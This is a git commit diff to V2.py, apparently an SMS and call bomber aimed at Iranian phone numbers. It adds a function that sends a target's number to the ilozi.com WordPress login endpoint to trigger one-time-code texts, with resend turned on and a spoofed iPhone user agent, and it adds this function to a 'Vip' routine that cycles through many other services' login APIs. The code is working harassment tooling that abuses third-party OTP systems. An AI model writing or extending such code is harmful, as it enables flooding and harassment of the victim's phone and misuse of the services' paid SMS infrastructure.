e98e9555ac9e69b0aeabd4bbcc474fff3c9dacba
mehdi4430 <mehdi.target0@gmail.com>
2025-08-26 00:20:34 +0330

    Update V2.py

--- V2.py
+++ V2.py
@@ -83,6 +83,47 @@ def ragham_call(phone):
         print(f'{r}[!] Ragham - Call Exception: {e}{a}')
         return False
 
+
+
+def ilozi(phone):
+    url = "https://ilozi.com/wp-admin/admin-ajax.php"
+    payload = {
+        "login_digt_countrycode": "+98",
+        "digits_phone": phone,  # شماره بدون صفر و بدون +98
+        "action_type": "phone",
+        "sms_otp": "",
+        "otp_step_1": "1",
+        "digits_otp_field": "1",
+        "digits": "1",
+        "instance_id": "6fb17492e0d343df4e533a9deb8ba6b9",
+        "action": "digits_forms_ajax",
+        "type": "login",
+        "digits_redirect_page": "https://ilozi.com/my-account/?action=register",
+        "digits_form": "3780032f76",
+        "_wp_http_referer": "/?login=true&page=2",
+        "show_force_title": "1",
+        "otp_resend": "true",
+        "container": "digits_protected",
+        "sub_action": "sms_otp"
+    }
+    headers = {
+        "User-Agent": "Mozilla/5.0 (iPhone; CPU iPhone OS 16_6 like Mac OS X)",
+        "Content-Type": "application/x-www-form-urlencoded",
+        "X-Requested-With": "XMLHttpRequest"
+    }
+    try:
+        response = post(url, data=payload, headers=headers, timeout=10)
+        if response.status_code == 200 and response.json().get("success"):
+            print(f'{g}(Ilozi) {a}Code Sent')
+            return True
+        else:
+            print(f'{y}[-] (Ilozi) Failed or No Response{a}')
+            return False
+    except Exception as e:
+        print(f'{r}[!] Ilozi Exception: {e}{a}')
+        return False
+
+
 def achareh(phone):
     url = "https://api.achareh.co/v2/accounts/login/"
     payload = {"phone": "98" + phone.split("+98")[1]}
@@ -310,7 +351,7 @@ def Vip(phone, Time):
     drnext, pindo, shahrfarsh, tetherland, snapp_market,
     trip_call, paklean_call, ragham_call,
     digikala, barghman,
-    achareh, snappshop, bimebazar, komodaa, alopeyk_safir
+    achareh, snappshop, bimebazar, ilozi, komodaa, alopeyk_safir
 ]
     total_services = len(services)
     
